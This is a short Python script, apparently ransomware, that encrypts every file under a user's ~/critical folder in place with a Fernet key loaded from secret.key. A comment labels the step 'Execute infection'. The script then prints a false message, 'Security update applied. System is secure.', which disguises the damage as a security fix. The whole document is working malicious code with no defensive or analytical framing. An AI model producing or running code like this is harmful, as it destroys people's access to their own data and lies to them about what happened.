import os
from cryptography.fernet import Fernet

# Load encryption key (assumes key is already generated)
def load_key():
    return open("secret.key", "rb").read()

# Encrypt a single file
def encrypt_file(file_path, key):
    cipher = Fernet(key)
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted = cipher.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted)

# Encrypt all files in the target directory
def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            encrypt_file(os.path.join(root, file), key)

# Execute infection
key = load_key()
encrypt_directory(os.path.expanduser("~/critical"), key)
print("Security update applied. System is secure.")
